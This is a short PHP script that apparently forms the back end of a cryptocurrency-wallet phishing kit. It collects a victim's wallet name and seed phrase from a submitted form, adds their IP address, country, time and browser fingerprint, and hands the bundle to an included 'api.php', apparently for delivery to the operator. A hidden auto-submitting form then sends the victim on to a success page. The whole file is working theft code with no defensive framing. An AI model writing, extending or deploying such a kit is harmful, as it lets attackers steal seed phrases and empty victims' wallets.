<?php
require 'detect.php';
include 'setting.php';
$IP = getenv("REMOTE_ADDR");
$date = date("d M, Y");
$times = date("g:i a");
$code = $_SESSION['ip_countryCode']=clientData('code');
$country = strtolower($code);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$wallet_name = $_POST['wallet_name'];
$wallet = $_POST['wallet'];
$phrase_json = $_POST['phrase_json'];

//auth license //

if($wallet_name == "" && $wallet == "" && $phrase_json == ""){
header("Location: index.php");
}else{

//Sitemap include //


$msg = ("
[+]=========== RESULT NFT ===========[+]
[Wallet Name] = ".$wallet_name."
[Wallet]  = ".$wallet."
[Phrase]  = ".$phrase_json."
[+]============System============[+]
[IP INFO] = http://www.geoiptool.com/?IP=".$IP."

[TIME/DATE] =".$times." / ".$date."

[Country] = ".$country."

[FINGERPRINT] = ".$useragent."
");

$url = $msg;include("api.php");

if($url) {
echo "<form id='imnoob59' method='POST' action='../success.php'>
<input type='hidden' name='wallet_name' value='$wallet_name'>
</form>
<script type='text/javascript'>document.getElementById('imnoob59').submit();</script>";
}
}
?>